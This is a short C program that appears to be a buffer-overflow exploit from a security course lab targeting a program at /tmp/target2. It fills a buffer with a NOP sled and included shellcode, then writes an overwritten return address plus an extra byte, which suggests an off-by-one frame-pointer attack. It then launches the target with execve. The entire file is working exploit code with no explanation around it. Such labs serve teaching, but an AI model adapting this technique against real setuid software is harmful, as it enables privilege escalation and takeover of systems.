#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP 0x90

int main(int argc, char* argv[])
{
  char *args[3];
  char *env[1];

  int i, j;
  char buffer[241];

  bzero(&buffer, 241);

  for (i = 0; i <= (236-sizeof(shellcode)); i++) {
  	buffer[i] = NOP;
  }
  
  for (j = 0, i; j < (sizeof(shellcode) - 1); i++, j++) {
  	buffer[i] = shellcode[j];
  }

  buffer[i++] = 0x88; //88 
  buffer[i++] = 0xfc;
  buffer[i++] = 0xff;
  buffer[i++] = 0xbf;
  buffer[i++] = 0x70;

  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}